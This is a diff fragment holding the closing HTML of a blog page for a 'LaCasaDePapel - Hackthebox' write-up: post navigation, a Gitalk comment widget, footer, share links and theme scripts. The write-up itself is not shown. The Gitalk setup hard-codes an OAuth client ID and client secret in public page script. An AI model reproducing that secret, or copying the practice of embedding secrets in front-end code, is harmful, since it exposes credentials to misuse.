+        <h4 class="title">ScriptKiddie - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Brainfuck - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/&title=《LaCasaDePapel - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/&title=《LaCasaDePapel - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《LaCasaDePapel - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACtUlEQVR42u3aOW4DMQwFUN//0gkQpAiQzORzke3iTWV4ofVUiALJxyN+Pr6e3+/8fO6/n8Sv/svag4eHh9da+tXze7lXnyZx7qP11vDPFuDh4eEd490ng/tDOcFXE0Ye8x8LHh4e3kt5+aGfb0eSbPJtwsPDw3s3Xo+RJIOEgYeHh/duvKQQUC0u3P+2V6Q4WGvBw8PDi3m90sBrXx/s7+Hh4eENuur5sVv9ZpIYJiv8joOHh4d3gFctGWyNTFWHEpKCb3lxeHh4eC1edbiqWibIr+lJcTb/9I+8h4eHh7fEm6SKHDYpASfvl9MbHh4e3hJvPkS1dRXuJaqFWz8eHh5ekTcfk8q3oFoUrg4o4OHh4T2Hlw889S7E+ShANQlFkfHw8PCWePnSt8YFenGaY6l4eHh4B3i95lPS+qpef3Nk04KHh4e3xJs045MyQZIS8vjlrcTDw8M7wJssvXrE54DeNy8j4OHh4R3gzY/+fCygNzSwkIrw8PDwlnh5+6rcTws2brePh4eHh/ccXnWsqpdI8qv5JG2UkXh4eHgtXnVgtFeqyI/+rfXg4eHhneNVC695MXcrcjV1XRZw8fDw8JZ4kzv4vPXVewoFaDw8PLwDvF4xojoCVd2+yVY+8gcPDw9viVc9ZPNDv3r57pUkRvMReHh4eMUIeam02qbKo/ViFlICHh4e3hKvd9lNEkBy4d5qg13+Fg8PD+8wr1pW2CraVk/1fBwBDw8Pb5c3bz7l1+vq8EFebrj8LR4eHt4B3qQZloToHev5hX4ysIWHh4c34SXJIC8W9FpWk2hRTw8PDw/vAC85pqsjAvOybC+p4OHh4b0nr9rcmqSW6v/i4eHhvQ+vN0yQxIk6dUEJGA8PD++ZvOqyeiWMyb+M7tp4eHh4q7xea6q36Ly5NdliPDw8vGO8Txyt5CkUJUXMAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
